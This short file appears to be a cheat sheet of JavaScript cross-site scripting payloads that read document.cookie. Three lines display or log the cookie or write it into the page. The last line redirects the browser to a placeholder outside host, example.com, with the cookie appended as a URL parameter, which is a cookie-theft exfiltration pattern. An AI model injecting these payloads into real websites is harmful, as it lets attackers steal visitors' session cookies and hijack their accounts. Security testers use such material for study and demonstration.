#Shows alert of the cookie
alert(document.cookie);

#Logs the cookie
console.log(document.cookie);

#Creates an arbitrary element with the contents being the cookie
var p = document.createElement('p');
p.textContent = document.cookie;
document.body.appendChild(p);

#Redirect to a website appending the cookie in the URL as a parameter
window.location='https://example.com/?cookie=' + encodeURIComponent(document.cookie);
